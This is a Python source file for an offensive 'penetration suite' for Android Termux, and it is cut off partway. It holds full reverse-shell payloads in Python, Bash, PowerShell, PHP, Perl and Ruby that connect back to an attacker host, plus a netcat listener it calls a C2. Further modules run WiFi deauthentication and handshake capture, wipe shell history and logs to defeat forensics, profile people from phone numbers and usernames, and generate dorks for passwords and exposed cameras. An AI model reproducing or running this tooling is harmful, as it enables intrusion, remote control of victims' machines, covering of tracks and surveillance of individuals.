#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════════
# FORGOTTEN CORE v2.0 - Architect 02 Penetration Suite
# "What is buried shall remain buried. What is forgotten shall rise."
# Full Version - 25+ Modules Working on Termux (No Root)
# ═══════════════════════════════════════════════════════════════════════

import os
import sys
import json
import time
import hashlib
import subprocess
import threading
import socket
import base64
import random
import string
import re
from datetime import datetime
from urllib.parse import urlparse

# Check for optional imports
try:
    import requests
except:
    os.system("pip install requests")
    import requests

try:
    from cryptography.fernet import Fernet
except:
    os.system("pip install cryptography")
    from cryptography.fernet import Fernet

try:
    import dns.resolver
    DNS_AVAILABLE = True
except:
    DNS_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except:
    WHOIS_AVAILABLE = False

# ============================================================
# COLOR CODES
# ============================================================

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    DARK_RED = '\033[91m'
    BLOOD_RED = '\033[91m'
    ASH_GRAY = '\033[90m'
    VOID_BLACK = '\033[98m'
    DARK_PURPLE = '\033[95m'
    GHOST_WHITE = '\033[97m'
    ABYSS_BLUE = '\033[94m'
    DECAY_GREEN = '\033[92m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

# ============================================================
# MAIN CORE CLASS
# ============================================================

class ForgottenCore:
    def __init__(self):
        self.version = "2.0.0"
        self.codename = "Echoes of the Void"
        self.author = "Architect 02"
        self.user = "forgotten"
        self.host = "void"
        self.core_id = hashlib.sha256(os.urandom(32)).hexdigest()[:16]
        self.void_dir = os.path.expanduser("~/.forgotten_core")
        self.abyss_dir = f"{self.void_dir}/abyss_modules"
        self.shadow_dir = f"{self.void_dir}/shadow_payloads"
        self.ash_dir = f"{self.void_dir}/ash_logs"
        self.osint_dir = f"{self.void_dir}/osint_data"
        self.scan_dir = f"{self.void_dir}/scan_results"
        
        self.setup_void()
        
    def setup_void(self):
        """Create all necessary directories"""
        for d in [self.void_dir, self.abyss_dir, self.shadow_dir, 
                  self.ash_dir, self.osint_dir, self.scan_dir]:
            os.makedirs(d, exist_ok=True)
    
    def get_path(self):
        """Get current directory like pwd"""
        current = os.getcwd()
        home = os.path.expanduser("~")
        if current.startswith(home):
            return current.replace(home, "~")
        return current
    
    def prompt(self):
        """Kali Linux style prompt"""
        path = self.get_path()
        return f"{Colors.RED}{Colors.BOLD}┌──({Colors.RED}{self.user}@{Colors.RED}{self.host}{Colors.RED})-{Colors.RED}[{path}]{Colors.RED}\n└─{Colors.WHITE}${Colors.END} "
    
    def clear_screen(self):
        os.system("clear")
        self.banner()
    
    def banner(self):
        """Display banner"""
        banner = f"""
{Colors.RED}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════════════╗
║  ███████╗ ██████╗ ██████╗  ██████╗ ████████╗████████╗███████╗███╗   ██╗    ║
║  ██╔════╝██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝╚══██╔══╝██╔════╝████╗  ██║    ║
║  █████╗  ██║   ██║██████╔╝██║   ██║   ██║      ██║   █████╗  ██╔██╗ ██║    ║
║  ██╔══╝  ██║   ██║██╔══██╗██║   ██║   ██║      ██║   ██╔══╝  ██║╚██╗██║    ║
║  ██║     ╚██████╔╝██║  ██║╚██████╔╝   ██║      ██║   ███████╗██║ ╚████║    ║
║  ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═══╝    ║
║                         ██████╗ ██████╗ ██████╗ ███████╗                 ║
║                        ██╔════╝██╔═══██╗██╔══██╗██╔════╝                 ║
║                        ██║     ██║   ██║██████╔╝█████╗                   ║
║                        ██║     ██║   ██║██╔══██╗██╔══╝                   ║
║                        ╚██████╗╚██████╔╝██║  ██║███████╗                 ║
║                         ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝                 ║
╚═══════════════════════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.DIM}                    v{self.version} - "{self.codename}"{Colors.END}
{Colors.ASH_GRAY}{Colors.DIM}         "What is buried shall remain buried. What is forgotten shall rise."{Colors.END}
        """
        print(banner)
    
    def show_help(self):
        """Show all available commands"""
        help_text = f"""
{Colors.RED}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════════╗
║                         AVAILABLE COMMANDS                                          ║
╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.DARK_RED}
  ╔═══════════════════════════════════════════════════════════════════════════╗
  ║  {Colors.BOLD}🔥 ATTACK MODULES{Colors.END}                                                              
  ╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.RED}
    [01] {Colors.WHITE}wifi / w{Colors.DIM}          - WiFi attacks (deauth, scan, handshake){Colors.END}
    [02] {Colors.WHITE}payload / p{Colors.DIM}      - Generate reverse shell payloads (6 types){Colors.END}
    [03] {Colors.WHITE}c2 / server{Colors.DIM}      - Start C2 / listener server{Colors.END}
    [04] {Colors.WHITE}stealth / s{Colors.DIM}      - Clean traces, wipe logs{Colors.END}
    [05] {Colors.WHITE}anon / a{Colors.DIM}         - Anonymity (Tor, proxy chain){Colors.END}
{Colors.DARK_RED}
  ╔═══════════════════════════════════════════════════════════════════════════╗
  ║  {Colors.BOLD}🔍 OSINT & RECON MODULES{Colors.END}                                                         
  ╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.RED}
    [06] {Colors.WHITE}phone / tel{Colors.DIM}      - Phone number OSINT with carrier detection{Colors.END}
    [07] {Colors.WHITE}ip / geo{Colors.DIM}         - IP address geolocation tracker{Colors.END}
    [08] {Colors.WHITE}username / user{Colors.DIM}  - Check username across 20+ social media{Colors.END}
    [09] {Colors.WHITE}subdomain / sub{Colors.DIM}  - Subdomain scanner (150+ common subdomains){Colors.END}
    [10] {Colors.WHITE}port / scan{Colors.DIM}      - Fast TCP port scanner{Colors.END}
    [11] {Colors.WHITE}dork / google{Colors.DIM}    - Google dork generator (5 categories){Colors.END}
    [12] {Colors.WHITE}email / mail{Colors.DIM}     - Email OSINT / breach check{Colors.END}
    [13] {Colors.WHITE}whois{Colors.DIM}            - WHOIS domain lookup{Colors.END}
    [14] {Colors.WHITE}dns{Colors.DIM}              - DNS lookup (A, MX, NS, TXT, etc){Colors.END}
    [15] {Colors.WHITE}reverseip / revip{Colors.DIM} - Reverse IP / PTR lookup{Colors.END}
{Colors.DARK_RED}
  ╔═══════════════════════════════════════════════════════════════════════════╗
  ║  {Colors.BOLD}🛠️ UTILITY MODULES{Colors.END}                                                              
  ╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.RED}
    [16] {Colors.WHITE}crypt / encrypt{Colors.DIM}  - AES file encryption/decryption{Colors.END}
    [17] {Colors.WHITE}hash{Colors.DIM}             - Hash generator (MD5, SHA1, SHA256, SHA512){Colors.END}
    [18] {Colors.WHITE}encode{Colors.DIM}           - Base64/URL encoder decoder{Colors.END}
    [19] {Colors.WHITE}mac{Colors.DIM}              - MAC address changer (requires root){Colors.END}
    [20] {Colors.WHITE}webcam{Colors.DIM}           - Webcam capture (termux-api){Colors.END}
    [21] {Colors.WHITE}passgen / pg{Colors.DIM}     - Random password generator{Colors.END}
    [22] {Colors.WHITE}banner{Colors.DIM}           - Custom ASCII banner generator{Colors.END}
{Colors.DARK_RED}
  ╔═══════════════════════════════════════════════════════════════════════════╗
  ║  {Colors.BOLD}⚙️ SYSTEM COMMANDS{Colors.END}                                                             
  ╠═══════════════════════════════════════════════════════════════════════════╣{Colors.END}
{Colors.ASH_GRAY}
    [23] {Colors.WHITE}clear / cls{Colors.DIM}      - Clear screen{Colors.END}
    [24] {Colors.WHITE}help / ?{Colors.DIM}         - Show this help{Colors.END}
    [25] {Colors.WHITE}exit / quit{Colors.DIM}      - Exit Forgotten Core{Colors.END}
{Colors.DARK_RED}╚═══════════════════════════════════════════════════════════════════════════╝{Colors.END}
        """
        print(help_text)
    
    # ============================================================
    # ATTACK MODULES
    # ============================================================
    
    def wifi_attack(self):
        """WiFi attack module (requires root + external adapter)"""
        aircrack_check = subprocess.run(['which', 'airodump-ng'], capture_output=True)
        
        if aircrack_check.returncode != 0:
            print(f"""
{Colors.RED}[!] Aircrack-ng not installed!{Colors.END}
{Colors.YELLOW}
    WiFi attacks require:
    - Kali Linux OR
    - Rooted Android + external WiFi adapter
    - aircrack-ng package

    On Termux without root, use other modules:
    - payload (generate reverse shell)
    - c2 (start listener)
    - anon (anonymity)
    - osint modules (phone, ip, username, etc)
{Colors.END}
            """)
            return
        
        print(f"""
{Colors.BLOOD_RED}╔═══════════════════════════════════════════════════════════════╗
║                    VOID WIFI ATTACKS                                ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.RED}[1]{Colors.WHITE} Deauth Attack
{Colors.RED}[2]{Colors.WHITE} Scan Networks
{Colors.RED}[3]{Colors.WHITE} Capture Handshake
{Colors.ASH_GRAY}[4]{Colors.WHITE} Back
        """)
        choice = input(self.prompt())
        
        if choice == '1':
            iface = input(f"{self.prompt()}interface > ")
            bssid = input(f"{self.prompt()}target bssid > ")
            os.system(f"aireplay-ng --deauth 10 -a {bssid} {iface}")
        elif choice == '2':
            iface = input(f"{self.prompt()}interface > ")
            os.system(f"airodump-ng {iface}")
        elif choice == '3':
            iface = input(f"{self.prompt()}interface > ")
            bssid = input(f"{self.prompt()}bssid > ")
            channel = input(f"{self.prompt()}channel > ")
            os.system(f"airodump-ng --bssid {bssid} -c {channel} --write handshake {iface}")
    
    def generate_payload(self):
        """Generate reverse shell payloads"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    ABYSS PAYLOAD GENERATOR                           ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.RED}[1]{Colors.WHITE} Python Reverse Shell
{Colors.RED}[2]{Colors.WHITE} Bash Reverse Shell
{Colors.RED}[3]{Colors.WHITE} PowerShell Reverse Shell
{Colors.RED}[4]{Colors.WHITE} PHP Reverse Shell
{Colors.RED}[5]{Colors.WHITE} Perl Reverse Shell
{Colors.RED}[6]{Colors.WHITE} Ruby Reverse Shell
{Colors.ASH_GRAY}[7]{Colors.WHITE} Back
        """)
        choice = input(self.prompt())
        
        if choice == '7':
            return
        
        lhost = input(f"{self.prompt()}LHOST > ")
        lport = input(f"{self.prompt()}LPORT > ")
        
        payloads = {
            '1': f'''import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])''',
            '2': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            '3': f'''$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()''',
            '4': f'''<?php
set_time_limit(0);
$ip='{lhost}';
$port={lport};
$fp=fsockopen($ip,$port,$errno,$errstr);
if(!$fp){{die();}}
while(!feof($fp)){{
    $cmd=fgets($fp,1024);
    $output=shell_exec($cmd);
    fwrite($fp,$output);
}}
fclose($fp);
?>''',
            '5': f'''#!/usr/bin/perl
use Socket;
$i="{lhost}";
$p={lport};
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){{
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/sh -i");
}}''',
            '6': f'''#!/usr/bin/ruby
require 'socket'
c=TCPSocket.new("{lhost}",{lport})
while(cmd=c.gets)
    IO.popen(cmd,"r"){{|io|c.print io.read}}
end''',
        }
        
        ext = {'1': 'py', '2': 'sh', '3': 'ps1', '4': 'php', '5': 'pl', '6': 'rb'}
        lang = {'1': 'Python', '2': 'Bash', '3': 'PowerShell', '4': 'PHP', '5': 'Perl', '6': 'Ruby'}
        
        payload = payloads.get(choice, payloads['1'])
        filename = f"{self.shadow_dir}/payload_{lang[choice]}_{int(time.time())}.{ext[choice]}"
        
        with open(filename, 'w') as f:
            f.write(payload)
        
        os.chmod(filename, 0o755)
        
        print(f"""
{Colors.GREEN}[+] Payload saved: {filename}{Colors.END}
{Colors.WHITE}[*] Type: {lang[choice]} Reverse Shell{Colors.END}
{Colors.WHITE}[*] LHOST: {lhost} | LPORT: {lport}{Colors.END}
        """)
    
    def start_c2(self):
        """Start C2 / listener server"""
        print(f"""
{Colors.DARK_RED}╔═══════════════════════════════════════════════════════════════╗
║                    SPECTRE C2 SERVER                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.RED}[1]{Colors.WHITE} HTTP Server (python)
{Colors.RED}[2]{Colors.WHITE} Netcat Listener
{Colors.ASH_GRAY}[3]{Colors.WHITE} Back
        """)
        choice = input(self.prompt())
        
        if choice == '1':
            port = input(f"{self.prompt()}port (80) > ") or "80"
            print(f"{Colors.YELLOW}[*] Starting HTTP server on port {port}{Colors.END}")
            os.system(f"python3 -m http.server {port}")
        elif choice == '2':
            port = input(f"{self.prompt()}port (4444) > ") or "4444"
            print(f"{Colors.YELLOW}[*] Starting netcat listener on port {port}{Colors.END}")
            os.system(f"nc -lvnp {port}")
    
    def stealth_clean(self):
        """Clean traces and logs"""
        print(f"""
{Colors.DARK_RED}╔═══════════════════════════════════════════════════════════════╗
║                    CRYPT STEALTH CLEANER                             ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.RED}[1]{Colors.WHITE} Wipe Bash/Zsh History
{Colors.RED}[2]{Colors.WHITE} Clear System Logs
{Colors.RED}[3]{Colors.WHITE} Delete Temp Files
{Colors.RED}[4]{Colors.WHITE} Full Forensic Cleanup
{Colors.ASH_GRAY}[5]{Colors.WHITE} Back
        """)
        choice = input(self.prompt())
        
        if choice == '1':
            os.system("history -c")
            os.system("echo > ~/.bash_history")
            os.system("echo > ~/.zsh_history")
            print(f"{Colors.GREEN}[+] Shell history wiped{Colors.END}")
        elif choice == '2':
            os.system("rm -rf /data/data/com.termux/files/usr/var/log/* 2>/dev/null")
            print(f"{Colors.GREEN}[+] Logs cleared{Colors.END}")
        elif choice == '3':
            os.system("rm -rf /tmp/* 2>/dev/null")
            os.system("find ~ -name '*.pyc' -delete 2>/dev/null")
            print(f"{Colors.GREEN}[+] Temp files removed{Colors.END}")
        elif choice == '4':
            os.system("history -c")
            os.system("echo > ~/.bash_history")
            os.system("rm -rf /tmp/* 2>/dev/null")
            os.system("find ~ -name '*.pyc' -delete 2>/dev/null")
            print(f"{Colors.GREEN}[+] Full forensic cleanup complete{Colors.END}")
    
    def anonymity(self):
        """Anonymity module with Tor and proxy"""
        print(f"""
{Colors.DARK_RED}╔═══════════════════════════════════════════════════════════════╗
║                    VOID ANONYMITY MODULE                             ║
║              "Vanish without a trace"                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}

{Colors.GREEN}[1]{Colors.WHITE} Start Tor
{Colors.GREEN}[2]{Colors.WHITE} Check Current IP
{Colors.GREEN}[3]{Colors.WHITE} Anonymized IP (Tor)
{Colors.GREEN}[4]{Colors.WHITE} Back
        """)
        choice = input(self.prompt())
        
        if choice == '1':
            os.system("tor &")
            print(f"{Colors.GREEN}[+] Tor started on port 9050{Colors.END}")
        elif choice == '2':
            print(f"{Colors.CYAN}[*] Current IP:{Colors.END}")
            os.system("curl -s ifconfig.me")
            print()
        elif choice == '3':
            print(f"{Colors.CYAN}[*] Anonymized IP (Tor):{Colors.END}")
            os.system("proxychains4 curl -s ifconfig.me 2>/dev/null")
            print()
    
    # ============================================================
    # OSINT & RECON MODULES
    # ============================================================
    
    def phone_osint(self):
        """Phone number OSINT with Indonesia carrier detection"""
        print(f"""
{Colors.BLOOD_RED}╔═══════════════════════════════════════════════════════════════╗
║                    PHONE OSINT MODULE                                ║
║              "Unmask the caller"                                      ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        raw_number = input(f"{self.prompt()}phone number > ").strip()
        
        # Clean number
        clean_number = re.sub(r'[^0-9+]', '', raw_number)
        
        # Format to international
        if clean_number.startswith('0'):
            formatted = '+62' + clean_number[1:]
        elif clean_number.startswith('62') and not clean_number.startswith('+'):
            formatted = '+' + clean_number
        elif not clean_number.startswith('+'):
            formatted = '+62' + clean_number
        else:
            formatted = clean_number
        
        print(f"{Colors.YALLOW}[*] Cleaning: {raw_number} -> {formatted}{Colors.END}")
        print(f"{Colors.YALLOW}[*] Fetching data for {formatted}{Colors.END}\n")
        
        # Indonesia carrier database
        indonesian_prefixes = {
            '811': 'Telkomsel (Kartu As, simPATI)', '812': 'Telkomsel (Kartu As, simPATI)',
            '813': 'Telkomsel (Kartu As, simPATI)', '814': 'Indosat (IM3, Mentari)',
            '815': 'Indosat (IM3, Mentari)', '816': 'Indosat (IM3, Mentari)',
            '817': 'XL Axiata', '818': 'XL Axiata', '819': 'XL Axiata',
            '821': 'Telkomsel (Kartu As, simPATI)', '822': 'Telkomsel (Kartu As, simPATI)',
            '823': 'Telkomsel (Kartu As, simPATI)', '831': 'Axis', '832': 'Axis',
            '833': 'Axis', '838': 'Axis', '852': 'Telkomsel', '853': 'Telkomsel',
            '878': 'XL Axiata', '896': 'Tri (3)', '897': 'Tri (3)',
            '898': 'Tri (3)', '899': 'Tri (3)'
        }
        
        number_part = formatted.replace('+62', '')
        prefix = number_part[:3] if len(number_part) >= 3 else number_part
        
        print(f"{Colors.GREEN}{'='*60}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.WHITE}📱 PHONE OSINT RESULTS{Colors.END}")
        print(f"{Colors.GREEN}{'='*60}{Colors.END}\n")
        
        print(f"{Colors.CYAN}Number:{Colors.END} {formatted}")
        print(f"{Colors.CYAN}Clean:{Colors.END} +62{number_part}\n")
        
        if prefix in indonesian_prefixes:
            print(f"{Colors.GREEN}[✓] Carrier: {indonesian_prefixes[prefix]}{Colors.END}")
        
        # Analysis
        print(f"\n{Colors.YELLOW}[*] Analysis:{Colors.END}")
        print(f"    Length: {len(number_part)} digits")
        print(f"    Valid: {'✓' if 9 <= len(number_part) <= 12 else '✗'}")
        
        if number_part.startswith('8') and 9 <= len(number_part) <= 12:
            print(f"    Type: Mobile Phone (Indonesia)")
        elif number_part.startswith('2') and len(number_part) == 10:
            print(f"    Type: Landline (Indonesia)")
        else:
            print(f"    Type: International")
        
        # OSINT Tips
        print(f"\n{Colors.GREEN}[*] OSINT Tips:{Colors.END}")
        print(f"    • WhatsApp: https://wa.me/{formatted}")
        print(f"    • Telegram: https://t.me/+{formatted[1:]}")
        print(f"    • Google: https://www.google.com/search?q={formatted}")
        print(f"    • Facebook: https://www.facebook.com/search/top?q={formatted}")
        
        # Save
        filename = f"{self.osint_dir}/phone_{formatted.replace('+', '')}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(f"Phone: {formatted}\nTime: {datetime.now()}\n")
            if prefix in indonesian_prefixes:
                f.write(f"Carrier: {indonesian_prefixes[prefix]}\n")
        
        print(f"\n{Colors.GREEN}[+] Report saved to: {filename}{Colors.END}")
        print(f"{Colors.GREEN}{'='*60}{Colors.END}")
    
    def ip_tracker(self):
        """IP address geolocation tracker"""
        print(f"""
{Colors.BLOOD_RED}╔═══════════════════════════════════════════════════════════════╗
║                    IP TRACKER MODULE                                 ║
║              "Trace the digital footprint"                           ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        target_ip = input(f"{self.prompt()}target IP > ")
        
        try:
            resp = requests.get(f"http://ip-api.com/json/{target_ip}", timeout=10)
            data = resp.json()
            
            if data.get('status') == 'success':
                print(f"""
{Colors.GREEN}[+] IP Details:{Colors.END}
    IP: {data.get('query')}
    Country: {data.get('country')} ({data.get('countryCode')})
    Region: {data.get('regionName')}
    City: {data.get('city')}
    ZIP: {data.get('zip')}
    Latitude: {data.get('lat')}
    Longitude: {data.get('lon')}
    ISP: {data.get('isp')}
    Organization: {data.get('org')}
                """)
                print(f"{Colors.CYAN}[*] Google Maps: https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}{Colors.END}")
                
                filename = f"{self.osint_dir}/ip_{target_ip}_{int(time.time())}.txt"
                with open(filename, 'w') as f:
                    f.write(json.dumps(data, indent=2))
                print(f"{Colors.GREEN}[+] Saved to {filename}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] IP not found{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
    
    def username_check(self):
        """Check username across social media platforms"""
        print(f"""
{Colors.BLOOD_RED}╔═══════════════════════════════════════════════════════════════╗
║                    USERNAME OSINT MODULE                             ║
║              "Find digital footprints"                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        username = input(f"{self.prompt()}username > ")
        
        sites = {
            "Instagram": f"https://www.instagram.com/{username}",
            "Twitter": f"https://twitter.com/{username}",
            "GitHub": f"https://github.com/{username}",
            "Reddit": f"https://www.reddit.com/user/{username}",
            "TikTok": f"https://www.tiktok.com/@{username}",
            "YouTube": f"https://www.youtube.com/@{username}",
            "Telegram": f"https://t.me/{username}",
            "Facebook": f"https://www.facebook.com/{username}",
            "LinkedIn": f"https://www.linkedin.com/in/{username}",
            "Twitch": f"https://www.twitch.tv/{username}",
            "Spotify": f"https://open.spotify.com/user/{username}",
            "Pinterest": f"https://www.pinterest.com/{username}",
            "Tumblr": f"https://{username}.tumblr.com",
            "Snapchat": f"https://www.snapchat.com/add/{username}",
        }
        
        print(f"\n{Colors.YALLOW}[*] Checking username: {username}{Colors.END}\n")
        
        found = []
        for site, url in sites.items():
            try:
                resp = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                if resp.status_code == 200:
                    print(f"{Colors.GREEN}[✓] {site}: {url}{Colors.END}")
                    found.append(site)
                else:
                    print(f"{Colors.DIM}[✗] {site}: not found{Colors.END}")
            except:
                print(f"{Colors.DIM}[?] {site}: error{Colors.END}")
            time.sleep(0.2)
        
        filename = f"{self.osint_dir}/username_{username}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(f"Username: {username}\nFound on: {', '.join(found)}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Found {len(found)} profiles. Saved to {filename}{Colors.END}")
    
    def subdomain_scan(self):
        """Subdomain scanner"""
        print(f"""
{Colors.BLOOD_RED}╔═══════════════════════════════════════════════════════════════╗
║                    SUBDOMAIN SCANNER                                 ║
║              "Discover hidden services"                              ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        domain = input(f"{self.prompt()}domain > ")
        
        subdomains = [
            "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "ns2",
            "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap", "test", "ns",
            "blog", "pop3", "dev", "www2", "admin", "forum", "news", "vpn", "ns3",
            "mail2", "new", "mysql", "old", "lists", "support", "mobile", "mx",
            "static", "docs", "beta", "shop", "sql", "secure", "demo", "cp",
            "calendar", "wiki", "web", "media", "email", "images", "img",
            "download", "api", "app", "dashboard", "portal", "login", "auth",
            "account", "manager", "status", "stats", "cdn", "assets"
        ]
        
        print(f"{Colors.YALLOW}[*] Scanning {domain}{Colors.END}\n")
        
        found = []
        for sub in subdomains:
            test_domain = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(test_domain)
                print(f"{Colors.GREEN}[✓] {test_domain} -> {ip}{Colors.END}")
                found.append(test_domain)
            except:
                print(f"{Colors.DIM}[✗] {test_domain}{Colors.END}")
            time.sleep(0.05)
        
        filename = f"{self.scan_dir}/subdomains_{domain}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(f"Domain: {domain}\nFound: {', '.join(found)}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Found {len(found)} subdomains. Saved to {filename}{Colors.END}")
    
    def port_scanner(self):
        """Fast TCP port scanner"""
        print(f"""
{Colors.BLOOD_RED}╔═══════════════════════════════════════════════════════════════╗
║                    PORT SCANNER MODULE                               ║
║              "Find open doors"                                        ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        target = input(f"{self.prompt()}target IP/Domain > ")
        ports_input = input(f"{self.prompt()}ports (1-1000 or 80,443) > ") or "1-1000"
        
        if '-' in ports_input:
            start, end = map(int, ports_input.split('-'))
            port_range = range(start, end+1)
        else:
            port_range = [int(p.strip()) for p in ports_input.split(',')]
        
        print(f"{Colors.YALLOW}[*] Scanning {target}...{Colors.END}\n")
        
        open_ports = []
        total = len(port_range)
        count = 0
        
        for port in port_range:
            count += 1
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"{Colors.GREEN}[+] Port {port}: OPEN{Colors.END}")
                open_ports.append(port)
            sock.close()
            
            if count % 50 == 0:
                print(f"{Colors.DIM}[*] Progress: {count}/{total}{Colors.END}")
        
        filename = f"{self.scan_dir}/ports_{target}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(f"Target: {target}\nOpen ports: {open_ports}\nTime: {datetime.now()}\n")
        print(f"\n{Colors.GREEN}[+] Found {len(open_ports)} open ports. Saved to {filename}{Colors.END}")
    
    def dork_generator(self):
        """Google dork generator"""
        print(f"""
{Colors.BLOOD_RED}╔═══════════════════════════════════════════════════════════════╗
║                    GOOGLE DORK GENERATOR                             ║
║              "Find hidden data"                                       ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        dorks = {
            '1': {'name': 'Login Pages', 'dorks': [
                'inurl:login', 'inurl:admin', 'inurl:wp-admin', 'intitle:"login page"']},
            '2': {'name': 'Sensitive Files', 'dorks': [
                'ext:conf', 'ext:config', 'ext:sql', 'ext:db', 'ext:bak']},
            '3': {'name': 'Exposed Data', 'dorks': [
                'inurl:phpinfo.php', 'intitle:"index of"', 'inurl:dump.sql']},
            '4': {'name': 'Passwords', 'dorks': [
                'ext:passwd', 'ext:pwd', 'intext:"password" filetype:txt']},
            '5': {'name': 'Cameras', 'dorks': [
                'inurl:view/view.shtml', 'inurl:axis-cgi/jpg', 'intitle:"Live View"']}
        }
        
        print(f"{Colors.CYAN}Categories:{Colors.END}")
        for key, cat in dorks.items():
            print(f"{Colors.GREEN}[{key}]{Colors.WHITE} {cat['name']}{Colors.END}")
        print(f"{Colors.GREEN}[0]{Colors.WHITE} Custom dork{Colors.END}")
        
        choice = input(self.prompt())
        
        if choice == '0':
            dork = input(f"{self.prompt()}custom dork > ")
            print(f"\n{Colors.GREEN}[+] https://www.google.com/search?q={dork.replace(' ', '+')}{Colors.END}")
        elif choice in dorks:
            cat = dorks[choice]
            print(f"\n{Colors.GREEN}[+] {cat['name']} Dorks:{Colors.END}")
            for dork in cat['dorks']:
                print(f"{Colors.CYAN}    {dork}{Colors.END}")
                print(f"    https://www.google.com/search?q={dork.replace(' ', '+')}\n")
        
        filename = f"{self.osint_dir}/dorks_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(f"Dorks at {datetime.now()}\n")
            for cat in dorks.values():
                f.write(f"\n=== {cat['name']} ===\n")
                for dork in cat['dorks']:
                    f.write(f"{dork}\n")
        print(f"{Colors.GREEN}[+] Saved to {filename}{Colors.END}")
    
    def email_osint(self):
        """Email OSINT"""
        print(f"""
{Colors.BLOOD_RED}╔═══════════════════════════════════════════════════════════════╗
║                    EMAIL OSINT MODULE                                ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        email = input(f"{self.prompt()}email > ")
        
        if '@' not in email:
            print(f"{Colors.RED}[!] Invalid email{Colors.END}")
            return
        
        domain = email.split('@')[1]
        username = email.split('@')[0]
        
        print(f"\n{Colors.GREEN}[+] Domain: {domain}{Colors.END}")
        print(f"{Colors.GREEN}[+] Username: {username}{Colors.END}")
        
        # Check domain
        try:
            import dns.resolver
            mx = dns.resolver.resolve(domain, 'MX')
            print(f"{Colors.GREEN}[+] MX Records:{Colors.END}")
            for record in mx:
                print(f"    {record.exchange}")
        except:
            pass
        
        filename = f"{self.osint_dir}/email_{username}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(f"Email: {email}\nDomain: {domain}\nTime: {datetime.now()}\n")
        print(f"{Colors.GREEN}[+] Saved to {filename}{Colors.END}")
    
    def whois_lookup(self):
        """WHOIS lookup"""
        print(f"""
{Colors.BLOOD_RED}╔═══════════════════════════════════════════════════════════════╗
║                    WHOIS LOOKUP MODULE                               ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        domain = input(f"{self.prompt()}domain > ")
        
        try:
            import whois
            w = whois.whois(domain)
            print(f"""
{Colors.GREEN}[+] WHOIS Results:{Colors.END}
    Domain: {w.domain_name}
    Registrar: {w.registrar}
    Creation: {w.creation_date}
    Expiration: {w.expiration_date}
            """)
            filename = f"{self.osint_dir}/whois_{domain}_{int(time.time())}.txt"
            with open(filename, 'w') as f:
                f.write(str(w))
            print(f"{Colors.GREEN}[+] Saved to {filename}{Colors.END}")
        except:
            print(f"{Colors.RED}[!] WHOIS failed{Colors.END}")
            os.system(f"whois {domain}")
    
    def dns_lookup(self):
        """DNS lookup"""
